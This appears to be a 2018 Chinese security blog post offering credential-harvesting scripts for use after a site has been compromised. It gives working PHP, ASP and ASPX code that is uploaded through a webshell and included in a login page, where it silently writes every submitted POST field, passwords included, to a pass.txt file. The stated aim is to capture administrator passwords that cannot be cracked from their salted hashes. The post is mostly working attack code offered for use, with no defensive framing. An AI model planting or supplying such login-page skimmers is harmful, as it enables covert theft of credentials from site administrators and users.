---
title: "Web 密码记录脚本"
date: 2018-03-06T00:00:00+08:00
draft: false
author: "X1r0z"

tags: ['php','asp','asp.net']
categories: ['Web安全']

hiddenFromHomePage: false
hiddenFromSearch: false
twemoji: false
lightgallery: true
ruby: true
fraction: true
fontawesome: true
linkToMarkdown: true
rssFullText: false

toc:
  enable: true
  auto: true
code:
  copy: true
  maxShownLines: 50
math:
  enable: false
share:
  enable: true
comment:
  enable: true
---


写这些脚本主要是方便记录管理员的密码.

通常为 md5+salt 或者为 强密码 无法解密.

需要上传至 webshell.

<!--more-->

脚本均已在本地测试成功.

在对应的 login 文件上 include 即可.

默认保存在同目录下的 pass.txt 记录所有 POST 变量

## php

```
<?php
if (isset($_POST)){
	$f = fopen('pass.txt','a+');
	foreach ($_POST as $k=>$v){
		fwrite($f,$k.':'.$v."\r\n");
	}
	fclose($f);
}
?>
```

## asp

```
<%
dim fs,fname
set fs=Server.CreateObject("Scripting.FileSystemObject")
set fname=fs.OpenTextFile(server.mappath("pass.txt"),8,true)
For i = 1 To Request.Form.Count
fname.WriteLine(""&Request.Form.Key(i)&":" & Request.Form(Request.Form.Key(i)))
Next
fname.Close
set fname=nothing
set fs=nothing
%>
```

## aspx

```
<%@ Page Language="Jscript"%>
<%@ import namespace="System.IO" %>
<%
var filepath = Server.MapPath("pass.txt");
var sw = new StreamWriter(filepath, true);
for (var i = 0;i<Request.Form.Count;i++){
sw.WriteLine(Request.Form.Keys[i].ToString() + ":" + Request.Form[i].ToString());
}
sw.Close();
%>
```

php 包含为 `include 'config.php'`.

asp 与 asp.net 为 `<!-- #include file="config.aspx" -->`.